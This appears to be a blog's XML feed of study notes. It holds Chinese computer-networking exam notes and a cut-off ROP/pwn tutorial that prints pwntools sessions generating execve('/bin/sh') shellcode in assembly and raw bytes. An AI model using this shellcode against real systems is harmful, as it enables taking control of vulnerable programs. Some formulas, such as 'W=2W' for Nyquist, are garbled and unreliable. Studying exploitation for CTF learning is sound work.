      <url>/2023/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%89%A9%E7%90%86%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<ul><li>感觉第一章包括了一些不太会考的知识点，物理层就简要一些吧，尽量向408考纲靠拢，主要还是依据书上的结构先复习一遍。</li></ul><h3 id="物理层的基本概念"><a href="#物理层的基本概念" class="headerlink" title="物理层的基本概念"></a>物理层的基本概念</h3><ul><li>物理层的协议也常称为物理层规程（procedure）</li></ul><blockquote><p>可以将物理层的主要任务描述为确定与传输媒体的接口有关的一些特性， 即：<br>(1) 机械特性指明接口所用接线器的形状和尺寸、引脚数目和排列、固定和锁定装装置等。平时常见的各种规格的接插件都有严格的标准化的规定。<br>(2) 电气特性指明在接口电缆的各条线上出现的<strong>电压的范围</strong>。<br>(3) 功能特性指明某条线上出现的<strong>某一电平的电压的意义</strong>。<br>(4) 过程特性指明对千不同功能的各种可能事件的<strong>出现顺序</strong>。</p></blockquote><ul><li>物理层要完成传输方式的转换：并行传输(计算机内部)——&gt;串行传输(通信线路)——&gt;并行传输</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231226203509837.png" alt="image-20231226203509837"></p><ul><li><p>源系统包含<strong>源点（源站，信源）</strong>和<strong>发送器（调制器）</strong>。</p></li><li><p>目的系统包含<strong>接收器（解调器）</strong>和<strong>终点（目的站，信宿）</strong>。</p></li></ul><blockquote><p>通信的目的是传送消息(message)。</p><p>数据(data)是运送消息的实体。 通常是有意义的符号序列。</p><p>信号(signal)则是数据的电气或电磁的表现。</p><p>依据参数的取值方式，可分为:</p><p>(1)模拟信号， 或连续信号代表消息的参数的取值是连续的.</p><p>(2) 数字信号， 或离散信号代表消息的参数的取值是离散的.</p></blockquote><ul><li>在使用时间域（或简称为时域） 的波形表示数字信号时， 代表不同离散数值的基本<strong>波形</strong>就称为<strong>码元</strong></li><li>一个码元所携带的信息量是不固定的， 而是由<strong>调制方式</strong>和<strong>编码方式</strong>决定的。</li></ul><h3 id="有关信道的几个基本概念"><a href="#有关信道的几个基本概念" class="headerlink" title="有关信道的几个基本概念"></a>有关信道的几个基本概念</h3><p>(1)单向通信又称为单工通信</p><p>(2)双向交替通信又称为半双工通信</p><p>(3) 双向同时通信又称为全双工通信</p><h4 id="常用编码方式-基带调制"><a href="#常用编码方式-基带调制" class="headerlink" title="常用编码方式( 基带调制)"></a>常用编码方式( 基带调制)</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>不归零制</td><td>正电平代表1, 负电平代表0。</td></tr><tr><td>归零制</td><td>正脉冲代表1, 负脉冲代表0。</td></tr><tr><td>曼彻斯特编码</td><td>周期中心的向上跳变代表0, 位周期中心的向下跳变代表1。</td></tr><tr><td>差分曼彻斯特编码</td><td>在每一位的中心处始终都有跳变。位开始边界有跳变代表0, 而位开始边界没有跳变代表1 。</td></tr></tbody></table></div><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231226204522363.png" alt="image-20231226204522363"></p><h4 id="基本的带通调制"><a href="#基本的带通调制" class="headerlink" title="基本的带通调制"></a>基本的带通调制</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231226204717726.png" alt="image-20231226204717726"></p><p> 即载波的振幅随基带数字信号而变化。例如， 0 或1 分别对应千无<br>载波或有载波输出。<br>• 调频(FM) 例如， 0或1分别对应千频率<br>Ji或几<br>• 调相(PM) 例如， 0 或1 分别对应千<br>相位0度或180度。</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>调幅(AM)</td><td>即载波的振幅随基带数字信号而变化。</td></tr><tr><td>调频(FM)</td><td>即载波的频率随基带数字信号而变化。</td></tr><tr><td>调相(PM)</td><td>即载波的初始相位随基带数字信号而变化。</td></tr></tbody></table></div><p>更复杂的正交振幅调制QAM (Quadrature Amplitude Modulation)。</p><h4 id="信道的极限容量"><a href="#信道的极限容量" class="headerlink" title="信道的极限容量"></a>信道的极限容量</h4><h5 id="奈氏准则"><a href="#奈氏准则" class="headerlink" title="奈氏准则"></a>奈氏准则</h5><p>在任何信道中， 码元传输的速率是有上限的， 传输速率超过此上限， 就会出现严重的<strong>码间串扰</strong>的问题， 使接收端对码元的判决（即识别）成为不可能。</p><p>W=2W</p><p>W为带宽</p><h5 id="信噪比"><a href="#信噪比" class="headerlink" title="信噪比"></a>信噪比</h5><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231226210332197.png" alt="image-20231226210332197"></p><p><code>香农公式</code></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231226210343917.png" alt="image-20231226210343917"></p><p>信道的带宽或信道中的信噪比越大， 信息的极限传输速率就越高。</p><h3 id="物理层下面的传输媒体"><a href="#物理层下面的传输媒体" class="headerlink" title="物理层下面的传输媒体"></a>物理层下面的传输媒体</h3><h4 id="导引型传输媒体"><a href="#导引型传输媒体" class="headerlink" title="导引型传输媒体"></a>导引型传输媒体</h4><ul><li>双绞线、同轴电缆、光纤与无线传输介质、架空明线</li></ul><h4 id="非导引型传输媒体"><a href="#非导引型传输媒体" class="headerlink" title="非导引型传输媒体"></a>非导引型传输媒体</h4><ul><li>无线电微波通信、卫星通信、红外通信、激光通信</li></ul><h3 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h3><p>先写到这些把</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第1章——概述</title>
      <link href="/2023/12/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/12/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%80%E7%AB%A0%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231226200311951.png" alt="image-20231226200311951"></p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>计算机网络（简称为网络）由若干结点(node)和连接这些结点的链路(link)组成。</p><p>互联网具有两个重要基本特点，即<strong>连通性</strong>和<strong>共享（资源共享）</strong></p><h3 id="计算机网络发展的三个阶段"><a href="#计算机网络发展的三个阶段" class="headerlink" title="计算机网络发展的三个阶段"></a>计算机网络发展的三个阶段</h3><div class="table-container"><table><thead><tr><th>年份</th><th>阶段</th></tr></thead><tbody><tr><td>1969年</td><td>从单个网络<strong>ARPANET</strong>向互联网发展的过程</td></tr><tr><td>1985年</td><td>是建成了三级结构的互联网<strong>NSFNET</strong></td></tr><tr><td>1993年</td><td>逐渐形成了多层次的ISP结构的互联网。（主干ISP，地区ISP，本地ISP）</td></tr></tbody></table></div><h4 id="互联网交换点IXP"><a href="#互联网交换点IXP" class="headerlink" title="互联网交换点IXP"></a>互联网交换点IXP</h4><p> 主要作用就是允许两个网络直接相连并交换分组， 而不需要再通过第三个网络来转发分组。<br/></p><h4 id="www"><a href="#www" class="headerlink" title="www"></a>www</h4><p>20世纪90年代，由欧洲原子核研究组织CERN开发的万维网<strong>WWW (World Wide Web)</strong>被广泛使用在互联网上。</p><h4 id="互联网标准"><a href="#互联网标准" class="headerlink" title="互联网标准"></a>互联网标准</h4><p>Step1:互联网草案(Internet Draft)</p><p>Step2: 建议标准( Proposed Standard) </p><p>Step3:互联网标准(Internet Standard)</p><div class="table-container"><table><thead><tr><th>Step</th><th></th></tr></thead><tbody><tr><td>互联网草案(Internet Draft)</td><td>有效期6个月</td></tr><tr><td>建议标准( Proposed Standard)</td><td>成为RFC文档</td></tr><tr><td>互联网标准(Internet Standard)</td><td>分配标准编号STD</td></tr></tbody></table></div><h3 id="互联网的组成"><a href="#互联网的组成" class="headerlink" title="互联网的组成"></a>互联网的组成</h3><h4 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>边缘部分</td><td>用户直接使用（通信和资源共享）</td></tr><tr><td>核心部分</td><td>为边缘部分提供服务（提供连通性和交换）</td></tr></tbody></table></div><p><code>主机A的某个进程和主机B上的另一个进程进行通信</code>被称为<code>计算机之间通信</code></p><p>可划分为两种方式</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>客户－服务器方式(C/S方式）</td><td>客户是服务请求方， 服务器是服务提供方。</td></tr><tr><td>对等方式(P2P方式）</td><td>每一台主机既是客户又同时是服务器。</td></tr></tbody></table></div><h3 id="互联网的核心部分"><a href="#互联网的核心部分" class="headerlink" title="互联网的核心部分"></a>互联网的核心部分</h3><p>在网络核心部分起特殊作用的是路由器（router) , 它是一种专用计算机（但不叫做主机）。路由器是实现<strong>分组交换(packet switching)</strong>的关键构件， 其任务是转发收到的分组， 这是网络核心部分最重要的功能。</p><p>采用网状拓扑结构</p><h4 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h4><p>建立连接（占用通信资源）-&gt;通话（一直占用通信资源）-&gt; 释放连接（归还通信资源）。</p><p>通话的全部时间内， 通话的两个用户始终占用端到端的通信资源。</p><h4 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h4><p>分组交换则采用<strong>存储转发技术</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231225141228890.png" alt="image-20231225141228890"></p><p>分组在传输时就这样<strong>一段一段地断续占用通信资源</strong>， 而且还省去了建立连接和释放连接的开销， 因而数据的传输效率更高。</p><p>(1)报文分组，加首部 <br/>(2)经路由器储存转发<br/>(3)在目的地合并<br/></p><div class="table-container"><table><thead><tr><th>优点</th><th>采用的手段</th></tr></thead><tbody><tr><td>高效</td><td>高效在分组传输的过程中动态分配传输带宽， 对通信链路是逐段占用</td></tr><tr><td>灵活</td><td>灵活为每一个分组独立地选择最合适的转发路由</td></tr><tr><td>迅速</td><td>迅速以分组作为传送单位， 可以不先建立连接就能向其他主机发送分组</td></tr><tr><td>可靠</td><td>保证可靠性的网络协议；分布式多路由的分组交换网， 使网络有很好的生存性</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>缺点</th><th></th></tr></thead><tbody><tr><td>时延</td><td>分组在各路由器存储转发时需要排队。</td></tr><tr><td>额外开销</td><td>分组必须携带控制信息，整个分组交换网络还需要专门的管理和控制机制。</td></tr></tbody></table></div><h4 id="报文交换"><a href="#报文交换" class="headerlink" title="报文交换"></a>报文交换</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>电路交换</td><td>整个报文的比特流连续地从源点直达终点， 好像在一个管道中传送。</td></tr><tr><td>报文交换</td><td>整个报文先传送到相邻结点， 全部存储下来后查找转发表， 转发到下一个结点。</td></tr><tr><td>分组交换</td><td>单个分组（这只是整个报文的一部分）传送到相邻结点， 存储下来后查找转发表， 转发到下一个结点。</td></tr></tbody></table></div><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231225142011481.png" alt="image-20231225142011481"></p><h3 id="计算机网络在我国的发展"><a href="#计算机网络在我国的发展" class="headerlink" title="计算机网络在我国的发展"></a>计算机网络在我国的发展</h3><p>1989年11月 CNPAC。1994年4月20日 接入互联网</p><h3 id="计算机网络的类别"><a href="#计算机网络的类别" class="headerlink" title="计算机网络的类别"></a>计算机网络的类别</h3><p>计算机网络主要是由一些通用的、可编程的硬件互连而成的。</p><h4 id="按照网络的作用范围"><a href="#按照网络的作用范围" class="headerlink" title="按照网络的作用范围"></a>按照网络的作用范围</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>广域网WAN（远程网）</td><td></td></tr><tr><td>城域网MAN</td><td></td></tr><tr><td>局域网LAN</td><td></td></tr><tr><td>个人局域网PAN</td></tr></tbody></table></div><h4 id="按照使用者"><a href="#按照使用者" class="headerlink" title="按照使用者"></a>按照使用者</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>公用网</td><td></td></tr><tr><td>专用网</td></tr></tbody></table></div><h4 id="本地接入网（居民接入网）"><a href="#本地接入网（居民接入网）" class="headerlink" title="本地接入网（居民接入网）"></a>本地接入网（居民接入网）</h4><h3 id="计算机网络的性能"><a href="#计算机网络的性能" class="headerlink" title="计算机网络的性能"></a>计算机网络的性能</h3><h4 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h4><p>数据的传输速率，即数据率或比特率。额定速率或标称速率。</p><h4 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h4><div class="table-container"><table><thead><tr><th>带宽</th><th></th></tr></thead><tbody><tr><td>频域称谓</td><td>指某个信号具有的频带宽度。</td></tr><tr><td>时域称谓</td><td>某通道传送数据的能力。</td></tr></tbody></table></div><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>实际数据量</p><h4 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h4><div class="table-container"><table><thead><tr><th>时延</th><th></th></tr></thead><tbody><tr><td>发送时延（传输时延）</td><td></td></tr><tr><td>传播时延</td><td></td></tr><tr><td>处理时延</td><td></td></tr><tr><td>排队时延</td></tr></tbody></table></div><p>总时延＝发送时延＋传播时延＋处理时延＋排队时延</p><p>对于高速网络链路， 我们提高的仅仅是数据的发送速率而不是比特在链路上的传播速率。</p><p>提高数据的发送速率只是减小了数据的发送时延。</p><h4 id="时延带宽积（一比特为单位的链路长度）"><a href="#时延带宽积（一比特为单位的链路长度）" class="headerlink" title="时延带宽积（一比特为单位的链路长度）"></a>时延带宽积（一比特为单位的链路长度）</h4><p>时延带宽积=发送时延*带宽</p><h4 id="往返时间RTT"><a href="#往返时间RTT" class="headerlink" title="往返时间RTT"></a>往返时间RTT</h4><p>有效数据率=数据长度/（发送时间+RTT）</p><h4 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h4><p>分为<strong>信道利用率</strong>和<strong>网络利用率</strong></p><p>D=D0/1-U</p><h4 id="非性能特征"><a href="#非性能特征" class="headerlink" title="非性能特征"></a>非性能特征</h4><p>费用、质量、标准化、可靠性、可拓展性和可升级性、易于管理和维护</p><h3 id="计算机网络的体系结构"><a href="#计算机网络的体系结构" class="headerlink" title="计算机网络的体系结构"></a>计算机网络的体系结构</h3><h4 id="网络协议三要素"><a href="#网络协议三要素" class="headerlink" title="网络协议三要素"></a>网络协议三要素</h4><p>(1) <strong>语法</strong>， 即数据与控制信息的结构或格式；<br>(2) <strong>语义</strong>， 即需要发出何种控制信息， 完成何种动作以及做出何种响应；<br>(3)<strong>同步</strong>， 即事件实现顺序的详细说明。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231225144502512.png" alt="image-20231225144502512"></p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>应用层</td><td>通过应用进程间的交互来完成特定网络应用。</td></tr><tr><td>运输层</td><td>向两台主机中进程之间的通信提供通用的数据传输服务。TCP&amp;UDP</td></tr><tr><td>网络层</td><td>为分组交换网上的不同主机提供通信服务，IP数据报。</td></tr><tr><td>数据链路层</td><td>IP数据报组装成帧(framing),在两个相邻结点间的链路上传送，包括数据和必要的控制信息（如同步信息、地址信息、差错控制等）。</td></tr><tr><td>物理层</td><td>物理层的任务就是透明地传输比特流</td></tr></tbody></table></div><ul><li>数据单元在不同层次的称呼：①传输层：TCP报文段，UDP数据报 ②网络层：分组、IP数据报 ③数据链路层：帧 ④物理层：比特</li></ul><h4 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h4><p>好处：</p><p>(1) 各层之间是独立的。</p><p>(2)灵活性好。<br>(3)结构上可分割开。<br>(4)易千实现和维护。<br>(5)能促进标准化工作。</p><p>通常各层所要完成的功能主要有以下一些：</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>差错控制</td><td>使相应层次对等方的通信更加可靠。</td></tr><tr><td>流量控制</td><td>发送端的发送速率必须使接收端来得及接收， 不要太快。</td></tr><tr><td>分段和重装</td><td>发送端将要发送的数据块划分为更小的单位， 在接收端将其还原</td></tr><tr><td>复用和分用</td><td>发送端几个高层会话复用一条低层的连接， 在接收端再进行分用。</td></tr><tr><td>连接建立和释放</td><td>交换数据前先建立一条逻辑连接， 数据传送结束后释放连接。</td></tr></tbody></table></div><p>缺点:有些功能会在不同的层次中重复出现， 因而产生了额外开销。</p><p>体系结构是抽象的， 而实现则是具体的， 是真正在运行的计算机硬件和软件。</p><p>对等层、协议栈</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231225183029276.png" alt="image-20231225183029276"></p><h3 id="实体、协议、服务和服务访问点"><a href="#实体、协议、服务和服务访问点" class="headerlink" title="实体、协议、服务和服务访问点"></a>实体、协议、服务和服务访问点</h3><h4 id="PDU"><a href="#PDU" class="headerlink" title="PDU"></a>PDU</h4><p>OSI参考模型把对等层次之间传送的数据单位称为该层的协议数据单元PDU (Protocol Data Unit)。</p><h4 id="SDU"><a href="#SDU" class="headerlink" title="SDU"></a>SDU</h4><p>OSI把层与层之间交换的数据的单位称为服务数据单元SDU (Service Data Unit),</p><p>本层的PDU为下层的SDU；</p><p>本层的SDU为上层的PDU</p><h4 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h4><p>协议是控制两个<strong>对等实体（或多个实体</strong>）进行通信的<strong>规则</strong>的集合。</p><p>在协议的控制下， 两个对等实体间的通信使得本层能够向上一层提供服务。要实现本层协议， 还需要使用下面一层所提供的服务。</p><p>下面的协议对上面的实体是透明的。</p><p><strong>协议</strong>是“ <strong>水平的</strong>＂， 即协议是控制对等实体之间通信的规则。</p><p><strong>服务</strong>是＂ <strong>垂直的</strong>＂， 即服务是由下层向上层通过层间接口提供的。</p><p><strong>服务原语</strong>：上层使用下层所提供的服务必须通过与下层交换一些命令。</p><h5 id="服务访问点SAP"><a href="#服务访问点SAP" class="headerlink" title="服务访问点SAP"></a>服务访问点SAP</h5><p>在同一系统中相邻两层的实体进行交互（即交换信息） 的地方， 通常称为服务访问点SAP (Service Access Point)。</p><p>TCP/IP协议可以为各式各样的应用提供服务（所谓的<strong>everything over IP</strong>), 同时TCP/IP协议也允许IP协议在各式各样的网络构成的互联网上运行（所谓的<strong>IP over everything</strong>)</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231225184813596.png" alt="image-20231225184813596"></p><h4 id="TCP-IP的体系结构"><a href="#TCP-IP的体系结构" class="headerlink" title="TCP/IP的体系结构"></a>TCP/IP的体系结构</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231225183342848.png" alt="image-20231225183342848"></p><p>网络的核心部分越简单越好，把一切复杂的部分让网络的边缘部分实现。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231225184857695.png" alt="image-20231225184857695"></p><p>批评意见：这个体系结构没有清晰地阐明区分接口和协议之间的关系，而链路层并非真正的一个层次，而仅仅是强调了IP层个与网络的接口。这个体系结构没有把重要的物理层和链路层的内容包含进来。</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>差不多就是这些知识点了，后面可能会补一些习题。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础rop</title>
      <link href="/2023/12/23/pwn/%E5%9F%BA%E7%A1%80rop/"/>
      <url>/2023/12/23/pwn/%E5%9F%BA%E7%A1%80rop/</url>
      
        <content type="html"><![CDATA[<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ROP的全称为Return-oriented programming（返回导向编程）</p><p>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="../../img/image-20231205210530558.png" alt="image-20231205210530558"></p><h5 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h5><p>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32,是大端序还是小端序</p><h5 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h5><p>RELRO 是 “Relocation Read-Only” 的缩写，用于保护程序的全局偏移表 (GOT) 免受攻击。</p><h5 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h5><p>Stack-canary（金丝雀保护），用于检测栈溢出攻击。它是一个随机的值，被插入到栈帧中，并在函数返回时被检查。</p><h5 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h5><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p><h5 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h5><p>PIE 是 “Position Independent Executable” 的缩写，它表示程序是否是位置无关的。</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>ret2shellcode</td><td>注入代码</td></tr><tr><td>ret2syscall</td><td>拼接需要执行系统调用的条件代码</td></tr><tr><td>ret2libc</td><td>调用</td></tr></tbody></table></div><p>`</p><div class="table-container"><table><thead><tr><th>程序架构信息</th><th>条件</th></tr></thead><tbody><tr><td>32位</td><td>Edx=0 —— EcX=0 —— [Ebx]=’/bin/sh’——  Eax=0xb  —— Int 0x80</td></tr><tr><td>64位</td><td>Rdx=0 —— Rsi=0 —— [Rdi]=’/bin/sh’ —— Rax=0x3b —— syscall</td></tr></tbody></table></div><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p><h4 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h4><h4 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h4><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>ret2shellcode是指攻击者需要自己将调用shell的机器码（也称shellcode）注入至内存中，随后利用栈溢出复写return_address，进而使程序跳转至shellcode所在内存。<code>前提是无NX保护,或bss段可执行</code><br/></p><h4 id="32位与64位操作系统的shellcraft-生成的shellcode"><a href="#32位与64位操作系统的shellcraft-生成的shellcode" class="headerlink" title="32位与64位操作系统的shellcraft()生成的shellcode"></a>32位与64位操作系统的shellcraft()生成的shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode=asm(shellcraft.sh())</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,<span class="string">&quot;awx&quot;</span></span><br><span class="line">    .<span class="keyword">global</span> _start</span><br><span class="line">    .<span class="keyword">global</span> __start</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">    .p2align <span class="number">0</span></span><br><span class="line">        /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">        /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x68</span></span><br><span class="line">        push <span class="number">0x732f2f2f</span></span><br><span class="line">        push <span class="number">0x6e69622f</span></span><br><span class="line">        mov ebx, esp</span><br><span class="line">        /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">        /* push <span class="string">&#x27;sh\x00\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x1010101</span></span><br><span class="line">        xor dword ptr [esp], <span class="number">0x1016972</span></span><br><span class="line">        xor ecx, ecx</span><br><span class="line">        push ecx /* null terminate */</span><br><span class="line">        push <span class="number">4</span></span><br><span class="line">        pop ecx</span><br><span class="line">        add ecx, esp</span><br><span class="line">        push ecx /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">        mov ecx, esp</span><br><span class="line">        xor edx, edx</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push <span class="number">11</span> /* <span class="number">0xb</span> */</span><br><span class="line">        pop eax</span><br><span class="line">        <span class="built_in">int</span> <span class="number">0x80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode</span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span>l</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="number">44</span> (<span class="number">0x2c</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode=asm(shellcraft.sh())</span><br><span class="line">[DEBUG] cpp -C -nostdinc -undef -P -I/home/randolfluo/.local/lib/python3<span class="number">.8</span>/site-packages/pwnlib/data/includes /dev/stdin</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,<span class="string">&quot;awx&quot;</span></span><br><span class="line">    .<span class="keyword">global</span> _start</span><br><span class="line">    .<span class="keyword">global</span> __start</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">    .p2align <span class="number">0</span></span><br><span class="line">        /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">        /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x68</span></span><br><span class="line">        mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">        push rax</span><br><span class="line">        mov rdi, rsp</span><br><span class="line">        /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">        /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">        xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">        xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">        push rsi /* null terminate */</span><br><span class="line">        push <span class="number">8</span></span><br><span class="line">        pop rsi</span><br><span class="line">        add rsi, rsp</span><br><span class="line">        push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">        mov rsi, rsp</span><br><span class="line">        xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push <span class="number">59</span> /* <span 